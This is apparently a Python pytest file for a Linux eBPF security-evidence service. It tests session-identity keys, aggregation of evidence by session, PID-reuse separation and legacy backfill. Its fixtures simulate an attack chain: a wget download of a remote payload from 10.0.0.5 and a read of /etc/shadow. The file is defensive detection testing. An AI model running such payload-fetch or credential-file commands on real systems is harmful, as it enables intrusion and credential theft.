"""eBPF 2.0 最终交付轮 P1-3：SecurityEvidence 会话身份 + 按 session-id 聚合视图。

验收点（审计轮 §4.2 P1-3 原定义）：
- 证据层挂会话键（process_exec_id / parent_exec_id，与 RuntimeEvent 同源）；
- 新增按 session-id 聚合视图：exec+网络+文件证据归属同一进程会话，
  PID 复用可区分，父子会话边可见；
- evidence_hash 基准不含会话键——升级前后证据身份零漂移（老数据重放
  不产生重复证据），存量缺身份证据行在重放时回填补写；
- 缺会话身份的存量证据如实标注 insufficient_session_identity，
  不凭 PID 拼接行为链。
"""
from __future__ import annotations

import json

import pytest
from sqlalchemy import create_engine, text
from sqlalchemy.orm import sessionmaker

from app import database as app_database
from app import models
from app.services.agent_tools import tool_query_process_evidence
from app.services.security_evidence import event_to_evidence, persist_evidence


@pytest.fixture(autouse=True)
def iot_env(monkeypatch):
    monkeypatch.setenv("LINUXGUARD_CONTROL_TOKEN", "stage2-test-token")


def _auth():
    return {"X-Control-Token": "stage2-test-token"}


def _upload(client, events):
    payload = "\n".join(json.dumps(event, ensure_ascii=False) for event in events)
    return client.post(
        "/api/runtime/ebpf/upload",
        files={"file": ("p13_session_events.jsonl", payload.encode("utf-8"), "application/jsonl")},
        headers=_auth(),
    )


HOST = "p13-session-host"


def _base_event(**overrides):
    event = {
        "timestamp": "2026-10-14T08:00:00Z",
        "hostname": HOST,
        "source": "ebpf_bpftrace",
        "event_type": "execve",
        "process_name": "wget",
        "process_id": 500,
        "parent_process_id": 400,
        "user": "root",
        "commandline": "wget http://10.0.0.5/payload",
    }
    event.update(overrides)
    return event


def _session_events():
    """一个完整行为链：sh(400) → wget(500)：exec + connect + openat；
    随后同 PID(500) 复用为 nginx（不同 boot 的 exec_id）——必须分成两个会话。"""
    return [
        _base_event(process_name="sh", process_id=400, parent_process_id=1, commandline="/bin/sh -c wget",
                    process_exec_id="lg-boot8-400-100", parent_exec_id="lg-boot8-1-10",
                    timestamp="2026-10-14T07:59:50Z"),
        _base_event(process_exec_id="lg-boot8-500-1700", parent_exec_id="lg-boot8-400-100",
                    timestamp="2026-10-14T08:00:00Z"),
        _base_event(event_type="connect", destination="10.0.0.5", port=1883,
                    process_exec_id="lg-boot8-500-1700", parent_exec_id="lg-boot8-400-100",
                    timestamp="2026-10-14T08:00:01Z"),
        _base_event(event_type="openat", file_path="/etc/shadow", rule="LG-eBPF watched file read",
                    process_exec_id="lg-boot8-500-1700", parent_exec_id="lg-boot8-400-100",
                    timestamp="2026-10-14T08:00:02Z"),
        _base_event(process_name="nginx", event_type="execve", commandline="nginx -g daemon off;",
                    process_exec_id="lg-deadbeef-500-8888", parent_exec_id="",
                    timestamp="2026-10-14T10:00:00Z"),
    ]


@pytest.fixture()
def seeded_asset(session_factory):
    db = session_factory()
    try:
        asset = models.LinuxAsset(hostname=HOST, ip_address="10.0.0.9", os_name="Ubuntu",
                                  os_version="24.04", distribution="ubuntu")
        db.add(asset)
        db.commit()
        return asset.id
    finally:
        db.close()


# ── 证据身份零漂移（哈希基准不含会话键） ──────────────────────────────────────

def test_evidence_hash_unchanged_by_session_identity():
    base = _base_event()
    plain = event_to_evidence(base)
    with_ids = event_to_evidence({**base, "process_exec_id": "lg-abc12345-500-1000",
                                  "parent_exec_id": "lg-abc12345-400-900"})
    assert plain["evidence_hash"] == with_ids["evidence_hash"]
    assert plain["evidence_id"] == with_ids["evidence_id"]
    # 会话键随记录透传
    assert with_ids["process_exec_id"] == "lg-abc12345-500-1000"
    assert with_ids["parent_exec_id"] == "lg-abc12345-400-900"
    assert plain["process_exec_id"] == ""


# ── 上传链路：事件会话键落到证据行 ────────────────────────────────────────────

def test_upload_events_carry_session_identity_to_evidence(client, seeded_asset):
    response = _upload(client, _session_events())
    assert response.status_code == 200, response.text
    events = client.get("/api/runtime/evidence", params={"device_id": HOST}).json()["events"]
    assert events, "上传事件应产生证据"
    wget_rows = [e for e in events if e["process"] == "wget"]
    assert {e["process_exec_id"] for e in wget_rows} == {"lg-boot8-500-1700"}, "exec_id 必须由事件透传"
    sh_rows = [e for e in events if e["process"] == "sh"]
    assert all(e["parent_exec_id"] == "lg-boot8-1-10" for e in sh_rows)


# ── 聚合视图：三类证据归一会话 + PID 复用分离 + 父子边 ────────────────────────

def test_sessions_group_types_separate_pid_reuse_and_link_parent(client, seeded_asset):
    _upload(client, _session_events())
    data = client.get(f"/api/runtime/assets/{seeded_asset}/evidence-sessions").json()
    assert data["session_count"] == 3, f"sh/wget/nginx 应为三个会话：{data}"

    by_exec = {s["process_exec_id"]: s for s in data["sessions"]}
    wget = by_exec["lg-boot8-500-1700"]
    assert wget["basis"] == "exec_id"
    assert wget["evidence_by_type"] == {"process": 1, "network": 1, "file": 1}, \
        "同一 exec_id 的 exec+connect+openat 证据必须归属同一会话"
    assert len(wget["evidence_ids"]) == 3
    assert all(eid.startswith("SE-") for eid in wget["evidence_ids"])
    assert wget["parent_exec_id"] == "lg-boot8-400-100"

    nginx = by_exec["lg-deadbeef-500-8888"]
    assert nginx["pid"] == wget["pid"], "夹具保证 PID 复用场景"
    assert nginx["id"] != wget["id"], "PID 复用不得并入同一会话"

    # 父子边：仅当父会话存在于同一资产
    edges = [(e["parent"], e["child"]) for e in data["edges"]]
    assert (f"{seeded_asset}:exec:lg-boot8-400-100", f"{seeded_asset}:exec:lg-boot8-500-1700") in edges
    # 与 timeline() 键名互相可对照（同一 exec_id → 同一会话键）
    timeline_view = client.get(f"/api/runtime/assets/{seeded_asset}/timeline").json()
    timeline_keys = {p["id"] for p in timeline_view["processes"] if p["basis"] == "exec_id"}
    assert f"{seeded_asset}:exec:lg-boot8-500-1700" in timeline_keys


def test_session_severity_and_time_bounds(client, seeded_asset):
    _upload(client, _session_events())
    data = client.get(f"/api/runtime/assets/{seeded_asset}/evidence-sessions").json()
    wget = next(s for s in data["sessions"] if s["process_exec_id"] == "lg-boot8-500-1700")
    assert wget["first_timestamp"] == "2026-10-14T08:00:00Z"
    assert wget["last_timestamp"] == "2026-10-14T08:00:02Z"
    assert wget["max_severity"] == "warning" and wget["max_severity_score"] >= 58, \
        "读 /etc/shadow 的 warning 应抬升会话严重度"


def test_evidence_sessions_404_for_unknown_asset(client):
    assert client.get("/api/runtime/assets/999999/evidence-sessions").status_code == 404


# ── 存量数据：缺会话身份如实标注 + 重放回填（零漂移升级路径） ──────────────────

def test_legacy_rows_without_exec_id_are_insufficient_not_pid_grouped(session_factory, seeded_asset):
    db = session_factory()
    try:
        for row in (models.SecurityEvidence(evidence_id="SE-legacy1", evidence_hash="legacy-hash-1",
                                            device_id=HOST, asset_id=seeded_asset,
                                            evidence_type="process", pid=500, ppid=400, process="wget",
                                            timestamp="2026-10-14T08:00:00Z"),
                    models.SecurityEvidence(evidence_id="SE-legacy2", evidence_hash="legacy-hash-2",
                                            device_id=HOST, asset_id=seeded_asset,
                                            evidence_type="network", pid=500, ppid=400, process="wget",
                                            destination_ip="10.0.0.5", destination_port=1883,
                                            timestamp="2026-10-14T08:00:01Z")):
            db.add(row)
        db.commit()
    finally:
        db.close()
    data = _get_sessions(session_factory, seeded_asset)
    # 两条存量证据都没有 exec_id：不得凭 pid=500 合并，各自独立并如实标注
    assert data["insufficient_identity_count"] == 2
    assert all(s["basis"] == "insufficient_session_identity" for s in data["sessions"])
    assert len({s["id"] for s in data["sessions"]}) == 2
    assert data["edges"] == [], "无会话身份时不得虚构父子边"


def _get_sessions(session_factory, asset_id):
    """直接调用服务层（与端点同函数），避免为纯服务层断言重复走 HTTP。"""
    from app.services.runtime_telemetry import evidence_sessions
    db = session_factory()
    try:
        return evidence_sessions(db, asset_id)
    finally:
        db.close()


def test_duplicate_replay_backfills_session_identity(client, seeded_asset, session_factory):
    """升级路径：P1 之前的证据行缺会话列值（模拟升级后的存量库状态）；
    同一 payload 重放 → 哈希一致走重复分支 → 不产生重复行，存量行回填会话键。

    语义注记：raw 参与哈希基准（P0 设计）。改变 payload 字段等于不同证据；
    回填针对的是"同一条证据在旧代码下丢失列值"的真实升级场景。
    """
    event = _base_event(process_exec_id="lg-boot8-500-1700", parent_exec_id="lg-boot8-400-100")
    assert _upload(client, [event]).status_code == 200

    # 模拟 P1 之前的存量行：会话列值为空（老 schema 没有这两列）
    db = session_factory()
    try:
        db.query(models.SecurityEvidence).update({"process_exec_id": "", "parent_exec_id": ""})
        db.commit()
    finally:
        db.close()

    assert _upload(client, [event]).status_code == 200  # 同一 payload 重放
    summary = client.get("/api/runtime/evidence/summary").json()
    assert summary["total"] == 1, "哈希一致：重放不得产生第二条证据"

    after = client.get("/api/runtime/evidence", params={"device_id": HOST}).json()["events"]
    assert after[0]["process_exec_id"] == "lg-boot8-500-1700", "重放回填会话键"
    assert after[0]["parent_exec_id"] == "lg-boot8-400-100"


# ── 智能体工具透出会话身份（P1-3：证据挂 session-id 供智能体消费） ─────────────

def test_agent_tool_rows_include_session_identity(session_factory):
    db = session_factory()
    try:
        persist_evidence(db, [_base_event(process_exec_id="lg-boot8-500-1700",
                                          parent_exec_id="lg-boot8-400-100")])
        result = tool_query_process_evidence(db, HOST)
        assert result["count"] == 1
        assert result["events"][0]["process_exec_id"] == "lg-boot8-500-1700"
        assert result["events"][0]["evidence_id"].startswith("SE-")
    finally:
        db.close()


# ── 存量库列迁移（老库升级到 P1-3 列） ────────────────────────────────────────

def test_security_evidence_column_migration_adds_session_columns(tmp_path, monkeypatch):
    """老库 security_evidence 无会话列 → _migrate_sqlite_schema 补列。"""
    db_path = tmp_path / "legacy.db"
    engine = create_engine(f"sqlite:///{db_path}", connect_args={"check_same_thread": False})
    with engine.begin() as conn:
        conn.execute(text(
            "CREATE TABLE security_evidence (id INTEGER PRIMARY KEY, evidence_id VARCHAR(64), "
            "evidence_hash VARCHAR(64), device_id VARCHAR(128), evidence_type VARCHAR(32))"))
    monkeypatch.setattr(app_database, "engine", engine)
    try:
        added = app_database._migrate_sqlite_schema()
        assert "security_evidence.process_exec_id" in added
        assert "security_evidence.parent_exec_id" in added
        columns = {row[1] for row in engine.connect().exec_driver_sql(
            "PRAGMA table_info('security_evidence')").fetchall()}
        assert {"process_exec_id", "parent_exec_id"} <= columns
        # 幂等：再次运行不重复添加
        assert app_database._migrate_sqlite_schema() == []
    finally:
        engine.dispose()
